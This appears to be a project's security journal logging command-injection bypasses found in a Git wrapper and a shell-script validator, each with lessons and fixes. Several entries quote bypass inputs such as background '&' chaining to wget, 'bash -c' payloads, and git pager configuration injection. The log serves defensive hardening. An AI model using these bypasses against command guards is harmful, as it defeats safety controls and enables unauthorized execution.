## 2026-03-30 - [Command Injection via Inadequate Command Restriction]
**Vulnerability:** Command injection/arbitrary command execution in `tas_pythonetics/src/tas_pythonetics/git_safety.py`. `GitActionGuard.authorize_command` failed to verify that the command being checked actually started with "git".
**Learning:** Security guards designed to filter specific harmful arguments (like `rebase` or `--force`) must also strictly enforce the root command identity, otherwise they inadvertently allow entirely different executables to bypass the filters.
**Prevention:** Always validate the root command (the first token) against a strict allowlist before applying argument-specific filters when performing command execution filtering.

## 2026-03-30 - [Command Injection via Git Global Options]
**Vulnerability:** Arbitrary command execution in `tas_pythonetics/src/tas_pythonetics/git_safety.py`. `GitActionGuard.authorize_command` failed to block global configuration options like `-c core.pager=...` or `--exec-path=...`, allowing command execution via Git even when root commands and destructive arguments were checked.
**Learning:** Checking for subcommands (like `rebase`) and harmful arguments (like `--force`) is insufficient if the underlying executable (Git) supports configuration injection that overrides executable paths or specifies arbitrary executables for standard operations.
**Prevention:** Explicitly block configuration-modifying arguments and paths (like `-c`, `--exec-path`, `--paginate`) when wrapping extensible command-line tools.

## 2026-03-31 - [Command Injection via Background Execution Operator]
**Vulnerability:** Command injection in `codex_tas_runner.py` via unhandled `&` bash operator. The script validator correctly tokenized and blocked malicious commands separated by `;`, `&&`, `||`, and `|`, but failed to include `&` in the list of command separators, allowing unauthorized commands to bypass the check when executed in the background (e.g., `echo ok & wget http://example.com`).
**Learning:** When validating bash or POSIX shell commands through tokenization, all control operators that separate commands must be strictly accounted for, including background execution (`&`), not just sequential or logical execution.
**Prevention:** Ensure the regular expression and tokenizer logic that split commands identify and handle all shell control operators, specifically `&`, alongside `;`, `&&`, `||`, and `|`.

## 2024-07-17 - [Process Substitution Command Injection Bypass]
**Vulnerability:** Command injection by process substitution `<(...)` and `>(...)` bypassed the command allowlist because `shlex.split` does not correctly tokenize them as commands.
**Learning:** `shlex.split` is insufficient to prevent advanced bash syntax like process substitution from executing arbitrary commands.
**Prevention:** Explicitly reject process substitution syntax `<(` and `>(` before tokenizing with `shlex`.
## 2026-03-31 - [Process Substitution Command Injection Bypass]
**Vulnerability:** Command injection by process substitution `<(...)` and `>(...)` bypassed the command allowlist because `shlex.split` does not correctly tokenize them as commands.
**Learning:** `shlex.split` is insufficient to prevent advanced bash syntax like process substitution from executing arbitrary commands.
**Prevention:** Explicitly reject process substitution syntax `<(` and `>(` before tokenizing with `shlex`.

## 2024-07-24 - Prevent Git Command Injection via `git config` and global options
**Vulnerability:** The Git wrapper allowed users to set arbitrary `git config` options and use global options like `-p`, which could be exploited for command injection via malicious configurations (e.g. `core.pager`).
**Learning:** Checking for flags naively without considering subcommand position allows bypassing filters. Subcommand-specific arguments (like `git log -p`) can overlap with global arguments (like `git -p status`) if not tracked via their position.
**Prevention:** Iterating through the tokens to locate the subcommand index allows separating global configuration/options (which shouldn't be overridden interactively) from safe, localized parameters (e.g., specific `-p` or `--patch` uses).

## 2024-07-27 - [Command Injection via Inadequate Command Restriction on Allowlisted Binaries]
**Vulnerability:** Command injection/arbitrary script execution in `codex_tas_runner.py`. The `validate_script` function authorized executions like `bash`, `python`, and `python3`, but did not restrict their arguments. This allowed bypassing the `ALLOWED_COMMANDS` check by passing arbitrary commands using the `-c` argument (e.g., `bash -c 'wget http://malicious'`).
**Learning:** Allowlisting binaries that can execute code or sub-processes natively (like `bash`, `sh`, `python`, `node`) is dangerous if the arguments are not properly scrutinized. Validating just the root command is insufficient.
**Prevention:** Explicitly block execution string arguments (such as `-c` or `-e`) for allowlisted binaries that have code-execution capabilities when processing shell arguments.

## 2026-04-01 - [Command Injection via Git --config-env Global Option]
**Vulnerability:** Arbitrary command execution in `tas_pythonetics/src/tas_pythonetics/git_safety.py`. `GitActionGuard.authorize_command` failed to block the `--config-env` global configuration option, allowing command execution via Git even when root commands, destructive arguments, and other global options (like `-c` and `--exec-path`) were checked.
**Learning:** Similar to `-c` and `--exec-path`, `--config-env` allows injecting configuration settings (like `core.pager`) via environment variables, which can lead to command execution.
**Prevention:** Explicitly block `--config-env` when wrapping Git or any extensible command-line tools, as it provides an alternative mechanism for injecting configurations.
## 2024-08-06 - [Command Injection via Concatenated GNU Options]
**Vulnerability:** The Git wrapper (`GitActionGuard`) attempted to block dangerous global options (like `-c`) but failed to account for GNU-style concatenated short options (e.g., `-ccore.pager=!echo pwned`), allowing command injection.
**Learning:** Naive equality checks (`token == "-c"`) in argument sanitizers are insufficient for command line utilities that allow concatenated short options. In addition, iterating through all arguments can falsely block valid subcommand arguments.
**Prevention:** Always check prefixes (`token.startswith("-c")`) when sanitizing short options that accept values. Ensure option parsing strictly separates global options from subcommand arguments.
